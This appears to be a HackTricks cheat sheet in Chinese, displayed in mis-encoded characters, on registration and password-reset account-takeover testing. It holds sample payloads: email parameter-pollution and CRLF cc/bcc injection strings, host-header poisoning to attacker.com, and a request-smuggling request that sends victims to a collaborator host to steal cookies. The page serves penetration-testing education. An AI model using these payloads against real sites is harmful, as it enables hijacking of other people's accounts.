# æ³¨å†Œä¸æ¥ç®¡æ¼æ´

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## æ³¨å†Œæ¥ç®¡

### é‡å¤æ³¨å†Œ

* å°è¯•ä½¿ç”¨ç°æœ‰ç”¨æˆ·åç”Ÿæˆ
* æ£€æŸ¥å˜æ›´ç”µå­é‚®ä»¶ï¼š
* å¤§å†™
* \+1@
* åœ¨ç”µå­é‚®ä»¶ä¸­æ·»åŠ ä¸€äº›å†…å®¹
* ç”µå­é‚®ä»¶åä¸­çš„ç‰¹æ®Šå­—ç¬¦ï¼ˆ%00, %09, %20ï¼‰
* åœ¨ç”µå­é‚®ä»¶åé¢æ”¾ç½®ç©ºç™½å­—ç¬¦ï¼š`test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### ç”¨æˆ·åæšä¸¾

æ£€æŸ¥æ‚¨æ˜¯å¦å¯ä»¥ç¡®å®šåº”ç”¨ç¨‹åºå†…éƒ¨æ˜¯å¦å·²ç»æ³¨å†Œäº†ç”¨æˆ·åã€‚

### å¯†ç ç­–ç•¥

åˆ›å»ºç”¨æˆ·æ—¶æ£€æŸ¥å¯†ç ç­–ç•¥ï¼ˆæ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨å¼±å¯†ç ï¼‰ã€‚\
åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£å‡­æ®ã€‚

### SQLæ³¨å…¥

[**æŸ¥çœ‹æ­¤é¡µé¢**](sql-injection/#insert-statement)äº†è§£å¦‚ä½•é€šè¿‡**SQLæ³¨å…¥**å°è¯•è´¦æˆ·æ¥ç®¡æˆ–é€šè¿‡æ³¨å†Œè¡¨å•æå–ä¿¡æ¯ã€‚

### Oauthæ¥ç®¡

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### SAMLæ¼æ´

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### æ›´æ”¹ç”µå­é‚®ä»¶

æ³¨å†Œåå°è¯•æ›´æ”¹ç”µå­é‚®ä»¶ï¼Œå¹¶æ£€æŸ¥æ­¤æ›´æ”¹æ˜¯å¦æ­£ç¡®éªŒè¯æˆ–å¯ä»¥å°†å…¶æ›´æ”¹ä¸ºä»»æ„ç”µå­é‚®ä»¶ã€‚

### æ›´å¤šæ£€æŸ¥

* æ£€æŸ¥æ˜¯å¦å¯ä»¥ä½¿ç”¨**ä¸€æ¬¡æ€§ç”µå­é‚®ä»¶**
* **é•¿å¯†ç **ï¼ˆ>200ï¼‰ä¼šå¯¼è‡´**DoS**
* **æ£€æŸ¥è´¦æˆ·åˆ›å»ºçš„é€Ÿç‡é™åˆ¶**
* ä½¿ç”¨username@**burp\_collab**.netå¹¶åˆ†æ**å›è°ƒ**

## **å¯†ç é‡ç½®æ¥ç®¡**

### é€šè¿‡å¼•ç”¨æ¥æºæ³„éœ²å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. è¯·æ±‚å°†å¯†ç é‡ç½®é“¾æ¥å‘é€åˆ°æ‚¨çš„ç”µå­é‚®ä»¶åœ°å€
2. ç‚¹å‡»å¯†ç é‡ç½®é“¾æ¥
3. ä¸æ›´æ”¹å¯†ç 
4. ç‚¹å‡»ä»»ä½•ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼ˆä¾‹å¦‚ï¼šFacebookï¼Œtwitterï¼‰
5. åœ¨Burp Suiteä»£ç†ä¸­æ‹¦æˆªè¯·æ±‚
6. æ£€æŸ¥refererå¤´æ˜¯å¦æ³„éœ²äº†å¯†ç é‡ç½®ä»¤ç‰Œã€‚

### å¯†ç é‡ç½®æŠ•æ¯’ <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. åœ¨Burp Suiteä¸­æ‹¦æˆªå¯†ç é‡ç½®è¯·æ±‚
2. åœ¨Burp Suiteä¸­æ·»åŠ æˆ–ç¼–è¾‘ä»¥ä¸‹å¤´éƒ¨ï¼š`Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. ä½¿ç”¨ä¿®æ”¹åçš„å¤´éƒ¨è½¬å‘è¯·æ±‚\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. å¯»æ‰¾åŸºäº_host header_çš„å¯†ç é‡ç½®URLï¼Œä¾‹å¦‚ï¼š`https://attacker.com/reset-password.php?token=TOKEN`

### é€šè¿‡ç”µå­é‚®ä»¶å‚æ•°è¿›è¡Œå¯†ç é‡ç½® <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### API å‚æ•°çš„ IDOR <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. æ”»å‡»è€…éœ€è¦ä½¿ç”¨ä»–ä»¬çš„è´¦æˆ·ç™»å½•å¹¶å‰å¾€ **æ›´æ”¹å¯†ç ** åŠŸèƒ½ã€‚
2. å¯åŠ¨ Burp Suite å¹¶æ‹¦æˆªè¯·æ±‚
3. å°†å…¶å‘é€åˆ°é‡æ”¾(repeater)æ ‡ç­¾å¹¶ç¼–è¾‘å‚æ•°ï¼šç”¨æˆ· ID/é‚®ç®±\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### å¼±å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

å¯†ç é‡ç½®ä»¤ç‰Œåº”è¯¥æ¯æ¬¡éƒ½éšæœºç”Ÿæˆä¸”å”¯ä¸€ã€‚\
å°è¯•ç¡®å®šä»¤ç‰Œæ˜¯å¦ä¼šè¿‡æœŸæˆ–æ˜¯å¦æ€»æ˜¯ç›¸åŒçš„ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”Ÿæˆç®—æ³•å¯èƒ½å¾ˆå¼±å¹¶ä¸”å¯ä»¥è¢«çŒœæµ‹ã€‚ä»¥ä¸‹å˜é‡å¯èƒ½ä¼šè¢«ç®—æ³•ä½¿ç”¨ã€‚

* æ—¶é—´æˆ³
* ç”¨æˆ·ID
* ç”¨æˆ·é‚®ç®±
* åå’Œå§“
* å‡ºç”Ÿæ—¥æœŸ
* å¯†ç å­¦
* ä»…æ•°å­—
* å°ä»¤ç‰Œåºåˆ—ï¼ˆå­—ç¬¦åœ¨ \[A-Z,a-z,0-9] ä¹‹é—´ï¼‰
* ä»¤ç‰Œé‡ç”¨
* ä»¤ç‰Œè¿‡æœŸæ—¥æœŸ

### æ³„éœ²å¯†ç é‡ç½®ä»¤ç‰Œ <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. ä½¿ç”¨ç‰¹å®šé‚®ç®±ä¾‹å¦‚ï¼štest@mail.com é€šè¿‡ API/UI è§¦å‘å¯†ç é‡ç½®è¯·æ±‚
2. æ£€æŸ¥æœåŠ¡å™¨å“åº”å¹¶æŸ¥æ‰¾ `resetToken`
3. ç„¶ååœ¨ URL ä¸­ä½¿ç”¨è¯¥ä»¤ç‰Œï¼Œå¦‚ `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### é€šè¿‡ç”¨æˆ·åå†²çªè¿›è¡Œå¯†ç é‡ç½® <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. åœ¨ç³»ç»Ÿä¸Šæ³¨å†Œä¸€ä¸ªä¸å—å®³è€…ç”¨æˆ·åç›¸åŒçš„ç”¨æˆ·åï¼Œä½†åœ¨ç”¨æˆ·åå‰åæ’å…¥ç©ºæ ¼ã€‚ä¾‹å¦‚ï¼š`"admin "`
2. ä½¿ç”¨æ¶æ„ç”¨æˆ·åè¯·æ±‚å¯†ç é‡ç½®ã€‚
3. ä½¿ç”¨å‘é€åˆ°ä½ é‚®ç®±çš„ä»¤ç‰Œé‡ç½®å—å®³è€…å¯†ç ã€‚
4. ä½¿ç”¨æ–°å¯†ç è¿æ¥åˆ°å—å®³è€…è´¦æˆ·ã€‚

å¹³å° CTFd æ›¾å¯¹æ­¤æ”»å‡»æ¼æ´ã€‚\
å‚è§ï¼š[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### é€šè¿‡è·¨ç«™è„šæœ¬æ”»å‡»æ¥ç®¡è´¦æˆ· <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. å¦‚æœ cookies é€‚ç”¨äºçˆ¶åŸŸï¼š`*.domain.com`ï¼Œåœ¨åº”ç”¨ç¨‹åºæˆ–å­åŸŸä¸­æ‰¾åˆ° XSS
2. æ³„éœ²å½“å‰çš„ **ä¼šè¯ cookie**
3. ä½¿ç”¨ cookie ä½œä¸ºç”¨æˆ·è¿›è¡Œè®¤è¯

### é€šè¿‡ HTTP è¯·æ±‚èµ°ç§æ¥ç®¡è´¦æˆ· <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. ä½¿ç”¨ **smuggler** æ£€æµ‹ HTTP è¯·æ±‚èµ°ç§çš„ç±»å‹ï¼ˆCL, TE, CL.TEï¼‰\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. åˆ¶ä½œä¸€ä¸ªè¯·æ±‚ï¼Œå°† `POST / HTTP/1.1` è¦†ç›–ä¸ºä»¥ä¸‹æ•°æ®ï¼š\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` ç›®çš„æ˜¯æ‰“å¼€é‡å®šå‘å—å®³è€…åˆ° burpcollab å¹¶çªƒå–ä»–ä»¬çš„ cookies\
3\. æœ€ç»ˆè¯·æ±‚å¯èƒ½çœ‹èµ·æ¥å¦‚ä¸‹
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone æŠ¥å‘Šåˆ©ç”¨äº†è¿™ä¸ªæ¼æ´
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### é€šè¿‡ CSRF å®ç°è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. ä¸º CSRF åˆ›å»ºæœ‰æ•ˆè½½è·ï¼Œä¾‹å¦‚ï¼šâ€œè‡ªåŠ¨æäº¤å¯†ç æ›´æ”¹çš„ HTML è¡¨å•â€
2. å‘é€æœ‰æ•ˆè½½è·

### é€šè¿‡ JWT å®ç°è´¦æˆ·æ¥ç®¡ <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token å¯èƒ½ç”¨äºç”¨æˆ·è®¤è¯ã€‚

* ä½¿ç”¨å¦ä¸€ä¸ªç”¨æˆ· ID / ç”µå­é‚®ä»¶ç¼–è¾‘ JWT
* æ£€æŸ¥ JWT ç­¾åæ˜¯å¦è–„å¼±

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## å‚è€ƒèµ„æ–™

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»æˆä¸ºè‹±é›„ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨ **HackTricks** ä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFTs**](https://opensea.io/collection/the-peass-family) æ”¶è—
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘ [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
